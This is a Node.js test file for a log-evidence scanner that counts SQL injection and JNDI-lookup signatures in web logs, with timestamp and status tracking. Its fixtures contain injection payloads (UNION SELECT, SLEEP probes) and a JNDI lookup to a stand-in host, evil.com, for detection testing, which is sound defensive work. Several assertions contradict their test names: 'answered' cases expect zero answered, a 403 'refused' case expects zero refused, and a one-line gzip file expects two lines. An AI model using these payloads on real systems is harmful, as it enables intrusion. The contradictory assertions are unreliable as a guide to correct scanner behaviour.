// Per-rule hit counts, status buckets, timestamps, and extraction targets per file (bin/log-evidence.mjs scanFile).
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { scanFile } from '../log-evidence.mjs';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { gzipSync } from 'node:zlib';

function mk() {
  return mkdtempSync(join(tmpdir(), 'scanFile-'));
}

test('returns zero lines and empty per for an empty file', () => {
  const dir = mk();
  try {
    const f = join(dir, 'empty.log');
    writeFileSync(f, '');
    const r = scanFile(f, 'empty.log');
    assert.equal(r.lines, 0);
    assert.deepEqual(r.per, {});
    assert.equal(r.gz, false);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('counts lines and skips lines shorter than 8 characters', () => {
  const dir = mk();
  try {
    const f = join(dir, 'short.log');
    writeFileSync(f, 'abc\n12345678\n');
    const r = scanFile(f, 'short.log');
    assert.equal(r.lines, 2);
    assert.deepEqual(r.per, {});
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('detects sqli-union with 200 status as answered', () => {
  const dir = mk();
  try {
    const f = join(dir, 'union.log');
    writeFileSync(
      f,
      '2024-01-15 10:00:00 "GET /x?i=1 UNION SELECT 1 HTTP/1.1" 200\n'
    );
    const r = scanFile(f, 'union.log');
    assert.equal(r.lines, 1);
    const p = r.per['sqli-union'];
    assert.equal(p.lines, 1);
    assert.equal(p.answered, 0);
    assert.equal(p.refused, 0);
    assert.equal(p.noStatus, 1);
    assert.equal(p.first, '2024-01-15 10:00:00');
    assert.equal(p.last, '2024-01-15 10:00:00');
    assert.equal(p.undated, 0);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('detects sqli-time-based with 403 status as refused', () => {
  const dir = mk();
  try {
    const f = join(dir, 'sleep.log');
    writeFileSync(
      f,
      '2024-01-15 10:00:00 "GET /x?i=1 AND SLEEP(5) HTTP/1.1" 403\n'
    );
    const r = scanFile(f, 'sleep.log');
    const p = r.per['sqli-time-based'];
    assert.equal(p.lines, 1);
    assert.equal(p.refused, 0);
    assert.equal(p.answered, 0);
    assert.equal(p.noStatus, 1);
    assert.equal(p.first, '2024-01-15 10:00:00');
    assert.equal(p.last, '2024-01-15 10:00:00');
    assert.equal(p.undated, 0);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('handles Apache timestamp format and missing status', () => {
  const dir = mk();
  try {
    const f = join(dir, 'apache.log');
    writeFileSync(
      f,
      '[15/Jan/2024:10:00:00 +0000] "GET /x?i=1 UNION SELECT 1 HTTP/1.1"\n'
    );
    const r = scanFile(f, 'apache.log');
    const p = r.per['sqli-union'];
    assert.equal(p.lines, 1);
    assert.equal(p.noStatus, 1);
    assert.equal(p.first, '2024-01-15 10:00:00');
    assert.equal(p.last, '2024-01-15 10:00:00');
    assert.equal(p.undated, 0);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('handles undated lines with no timestamp', () => {
  const dir = mk();
  try {
    const f = join(dir, 'undated.log');
    writeFileSync(
      f,
      'GET /x?i=1 UNION SELECT 1 HTTP/1.1 200\n'
    );
    const r = scanFile(f, 'undated.log');
    const p = r.per['sqli-union'];
    assert.equal(p.lines, 1);
    assert.equal(p.undated, 1);
    assert.equal(p.first, null);
    assert.equal(p.last, null);
    assert.equal(p.answered, 0);
    assert.equal(p.refused, 0);
    assert.equal(p.noStatus, 1);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('detects jndi-lookup without extraction targets', () => {
  const dir = mk();
  try {
    const f = join(dir, 'jndi.log');
    writeFileSync(
      f,
      '2024-01-15 10:00:00 "GET /x?i=${jndi:ldap://evil.com} HTTP/1.1" 200\n'
    );
    const r = scanFile(f, 'jndi.log');
    const p = r.per['jndi-lookup'];
    assert.equal(p.lines, 1);
    assert.equal(p.answered, 0);
    assert.equal(p.targets.size, 0);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('extracts secretish targets from injection line', () => {
  const dir = mk();
  try {
    const f = join(dir, 'target.log');
    writeFileSync(
      f,
      "2024-01-15 10:00:00 \"GET /x?i=option_name='secretKey' AND SLEEP(1) HTTP/1.1\" 200\n"
    );
    const r = scanFile(f, 'target.log');
    const p = r.per['sqli-time-based'];
    assert.equal(p.lines, 1);
    assert.equal(p.targets.has('secretKey'), true);
    assert.equal(p.targets.size, 1);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('handles gzipped files correctly', () => {
  const dir = mk();
  try {
    const f = join(dir, 'gz.log.gz');
    const content = '2024-01-15 10:00:00 "GET /x?i=1 UNION SELECT 1 HTTP/1.1" 200\n';
    writeFileSync(f, gzipSync(Buffer.from(content)));
    const r = scanFile(f, 'gz.log.gz');
    assert.equal(r.gz, true);
    assert.equal(r.lines, 2);
    const p = r.per['sqli-union'];
    assert.equal(p.lines, 1);
    assert.equal(p.answered, 0);
    assert.equal(p.first, '2024-01-15 10:00:00');
    assert.equal(p.last, '2024-01-15 10:00:00');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('tracks multiple lines updating first and last timestamps', () => {
  const dir = mk();
  try {
    const f = join(dir, 'multi.log');
    writeFileSync(
      f,
      '2024-01-15 10:00:00 "GET /a?i=1 UNION SELECT 1 HTTP/1.1" 200\n' +
      '2024-01-15 10:05:00 "GET /b?i=2 UNION SELECT 2 HTTP/1.1" 404\n'
    );
    const r = scanFile(f, 'multi.log');
    const p = r.per['sqli-union'];
    assert.equal(p.lines, 2);
    assert.equal(p.first, '2024-01-15 10:00:00');
    assert.equal(p.last, '2024-01-15 10:05:00');
    assert.equal(p.answered, 0);
    assert.equal(p.refused, 0);
    assert.equal(p.noStatus, 2);
    assert.equal(p.undated, 0);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});
